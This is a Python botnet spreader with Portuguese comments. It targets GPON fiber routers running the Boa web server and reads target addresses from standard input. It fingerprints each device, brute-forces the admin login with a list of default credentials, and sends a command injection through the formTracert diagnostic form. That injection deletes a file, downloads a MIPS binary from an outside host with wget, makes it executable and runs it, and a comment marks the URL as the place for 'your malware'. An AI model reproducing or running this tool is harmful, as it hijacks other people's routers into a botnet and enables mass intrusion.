import sys
import socket
import time
import threading
import random
import os
from queue import Queue
import concurrent.futures

# Seu malware aqui
PAYLOAD = "http://100.100.100.100/bins/cirqueira.mips"

# Variáveis globais
status_logins = 0
status_attempted = 0
status_found = 0
logins_string = [
    "adminisp:adminisp", 
    "admin:admin",
    "admin:1234567890",
    "admin:123456789",
    "admin:12345678",
    "admin:1234567",
    "admin:123456",
    "admin:12345", 
    "admin:1234", 
    "admin:user", 
    "guest:guest", 
    "support:support", 
    "user:user", 
    "admin:password", 
    "default:default", 
    "admin:password123",
    "admin:cat1029",
    "admin:pass",
    "admin:dvr2580222",
    "admin:aquario",
    "admin:1111111",
    "administrator:1234"
]

# Lock para operações thread-safe
lock = threading.Lock()

def zero_byte(byte_array):
    """Limpa um array de bytes"""
    for i in range(len(byte_array)):
        byte_array[i] = 0
    return byte_array

def send_exploit(target):
    """Envia o exploit para o alvo"""
    try:
        host, port = target.split(':')
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
            conn.settimeout(60)
            conn.connect((host, int(port)))
            
            # Ajustando a URL do payload para corresponder ao código Go original
            payload = (
                f"POST /boaform/admin/formTracert HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                f"Accept-Language: en-GB,en;q=0.5\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 201\r\n"
                f"Origin: http://{target}\r\n"
                f"Connection: close\r\n"
                f"Referer: http://{target}/diag_tracert_admin_en.asp\r\n"
                f"Upgrade-Insecure-Requests: 1\r\n\r\n"
                f"target_addr=%3Brm%20-rf%20/var/tmp/wlancont%3Bwget%20{PAYLOAD}%20-O%20->/var/tmp/wlancont%3Bchmod%20777%20/var/tmp/wlancont%3B/var/tmp/wlancont%20fiber&waninf=1_INTERNET_R_VID_\r\n\r\n"
            )
            
            conn.send(payload.encode())
            conn.settimeout(60)
            
            try:
                response = conn.recv(512)
                if not response:
                    return -1
            except:
                return -1
                
        return -1
    except:
        return -1

def send_login(target):
    """Tenta fazer login com várias credenciais"""
    global status_logins
    
    is_logged_in = 0
    
    for login_combo in logins_string:
        login_split = login_combo.split(':')
        username = login_split[0]
        password = login_split[1]
        
        try:
            host, port = target.split(':')
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
                conn.settimeout(60)
                conn.connect((host, int(port)))
                
                content_length = 14 + len(username) + len(password)
                
                payload = (
                    f"POST /boaform/admin/formLogin HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-GB,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {content_length}\r\n"
                    f"Origin: http://{target}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Referer: http://{target}/admin/login.asp\r\n"
                    f"Upgrade-Insecure-Requests: 1\r\n\r\n"
                    f"username={username}&psd={password}\r\n\r\n"
                )
                
                conn.send(payload.encode())
                conn.settimeout(60)
                
                try:
                    response = conn.recv(512)
                    if not response:
                        continue
                        
                    if b"HTTP/1.0 302 Moved Temporarily" in response:
                        is_logged_in = 1
                        
                    if is_logged_in == 0:
                        conn.close()
                        continue
                    
                    with lock:
                        status_logins += 1
                    break
                    
                except:
                    continue
        except:
            continue
            
    if is_logged_in == 1:
        return 1
    else:
        return -1

def check_device(target, timeout):
    """Verifica se o dispositivo é vulnerável"""
    global status_found
    
    is_gpon = 0
    
    try:
        host, port = target.split(':')
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
            conn.settimeout(timeout)
            conn.connect((host, int(port)))
            
            payload = (
                f"POST /boaform/admin/formLogin HTTP/1.1\r\n"
                f"Host: {target}\r\n"
                f"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-GB,en;q=0.5\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 29\r\n"
                f"Origin: http://{target}\r\n"
                f"Connection: keep-alive\r\n"
                f"Referer: http://{target}/admin/login.asp\r\n"
                f"Upgrade-Insecure-Requests: 1\r\n\r\n"
                f"username=admin&psd=Feefifofum\r\n\r\n"
            )
            
            conn.send(payload.encode())
            conn.settimeout(timeout)
            
            try:
                response = conn.recv(512)
                if not response:
                    return -1
                
                if b"Server: Boa/0.93.15" in response:
                    with lock:
                        status_found += 1
                    is_gpon = 1
                
                if is_gpon == 0:
                    conn.close()
                    return -1
                
                conn.close()
                return 1
            except:
                return -1
    except:
        return -1

def process_target(target, rtarget):
    """Processa um alvo: verifica, tenta login e envia exploit"""
    try:
        if check_device(target, 10) == 1:
            send_login(target)
            send_exploit(target)
            return
        else:
            return
    except Exception as e:
        print(f"Error processing {target}: {e}")
        return

def status_printer():
    """Função para imprimir status periodicamente"""
    i = 0
    while True:
        print(f"{i}'s | Total: {status_attempted}, Found: {status_found}, Logins: {status_logins}", end="\r", flush=True)
        time.sleep(1)
        i += 1

def main():
    """Função principal"""
    global status_attempted
    
    if len(sys.argv) < 2:
        print("Uso: python fiber.py <porta>")
        sys.exit(1)
        
    # Inicializa o gerador de números aleatórios
    random.seed(int(time.time()))
    
    # Inicia thread para imprimir status
    status_thread = threading.Thread(target=status_printer, daemon=True)
    status_thread.start()
    
    # Configura o sistema para suportar muitas conexões (como no tutorial)
    try:
        # Tenta aumentar os limites do sistema (equivalente a ulimit no Linux)
        if os.name != 'nt':  # Se não for Windows
            import resource
            resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
            resource.setrlimit(resource.RLIMIT_NPROC, (999999, 999999))
    except:
        print("Warning: Could not increase system limits. Run with sudo for best performance.")
    
    # Usa ThreadPoolExecutor para gerenciar threads (equivalente às goroutines em Go)
    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as executor:
        try:
            while True:
                try:
                    line = input().strip()
                    if line:
                        target = f"{line}:{sys.argv[1]}"
                        with lock:
                            status_attempted += 1
                        executor.submit(process_target, target, line)
                except EOFError:
                    # Quando a entrada terminar (ex: final de um arquivo pipe)
                    break
        except KeyboardInterrupt:
            print("\nEncerrando o programa...")

if __name__ == "__main__":
    main()
